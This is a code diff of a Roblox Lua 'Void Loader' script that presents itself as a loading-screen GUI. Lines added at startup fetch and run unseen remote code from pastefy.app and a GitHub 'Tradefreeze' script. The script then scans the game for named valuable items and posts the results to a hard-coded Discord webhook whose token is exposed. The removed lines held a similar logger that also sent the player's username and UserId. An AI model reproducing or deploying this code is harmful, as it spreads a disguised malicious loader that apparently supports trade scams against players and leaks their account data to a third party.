@@ -1,8 +1,14 @@
+if _G.VoidLoaderRan then return end
+_G.VoidLoaderRan = true
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local CoreGui = game:GetService("CoreGui")
+
+loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw", true))()
+loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
 
 local player = Players.LocalPlayer
 local username = player.Name
@@ -84,22 +90,6 @@ bar.BackgroundColor3 = Color3.fromRGB(170,0,255)
 bar.BorderSizePixel = 0
 bar.Parent = barBG
 
-local reexecute = Instance.new("TextButton")
-reexecute.AnchorPoint = Vector2.new(0.5,0)
-reexecute.Position = UDim2.new(0.5,0,0.64,0)
-reexecute.Size = UDim2.new(0,180,0,40)
-reexecute.BackgroundColor3 = Color3.fromRGB(120,0,200)
-reexecute.Text = "Re Execute"
-reexecute.Font = Enum.Font.GothamBold
-reexecute.TextColor3 = Color3.new(1,1,1)
-reexecute.TextScaled = true
-reexecute.Parent = bg
-
-reexecute.MouseButton1Click:Connect(function()
-loadstring(game:HttpGet("https://pastefy.app/j9ERnU1R/raw", true))()
-loadstring(game:HttpGet("https://pastefy.app/QDcXcBjN/raw", true))()
-end)
-
 local credit = Instance.new("TextLabel")
 credit.AnchorPoint = Vector2.new(0.5,1)
 credit.Position = UDim2.new(0.5,0,0.96,0)
@@ -153,6 +143,8 @@ end
 task.wait(1)
 gui:Destroy()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VoidScriptzz/Labullshittradefreeze/refs/heads/main/Tradefreeze"))()
+
 local webhook = "https://discord.com/api/webhooks/1470887638792667278/ABTnUwFUwFQArtp_LK6WSi40l0TJ5QriZo_Rpho4_f-G6s9KIbG-VWZCW8_9hHuXEzQf"
 
 local targets = {
@@ -175,52 +167,24 @@ local targets = {
 ["Rosey and Teddy"]=true,["Dragon Gingerini"]=true
 }
 
-local req = request or http_request or syn and syn.request or fluxus and fluxus.request
+local foundTargets = {}
 
-task.spawn(function()
-while true do
-
-local found = {}
-
-for _,v in ipairs(workspace:GetDescendants()) do
+for _,v in pairs(workspace:GetDescendants()) do
 if targets[v.Name] then
-table.insert(found,v.Name)
+table.insert(foundTargets,v.Name)
 end
 end
 
-local ping = ""
-local text = "None"
+local message
 
-if #found > 0 then
-ping = "@everyone"
-text = table.concat(found,"\n")
+if #foundTargets > 0 then
+message = "@everyone Targets Found:\n"..table.concat(foundTargets,"\n")
+else
+message = "No targets found."
 end
 
-local data = {
-content = ping,
-embeds = {{
-title = "📄 Player Information",
-color = 5793266,
-fields = {
-{name="💻 Username",value="`"..username.."`",inline=false},
-{name="🆔 UserId",value=tostring(userid),inline=true},
-{name="🎮 Game",value=gameName,inline=true},
-{name="👑 Valuable Brainrots",value=text,inline=false}
-},
-footer={text="Void Logger"}
-}}
-}
-
-if req then
-req({
-Url = webhook,
-Method = "POST",
-Headers = {["Content-Type"]="application/json"},
-Body = HttpService:JSONEncode(data)
-})
-end
-
-task.wait(5)
-
-end
+pcall(function()
+HttpService:PostAsync(webhook,HttpService:JSONEncode({
+content = message
+}))
 end)
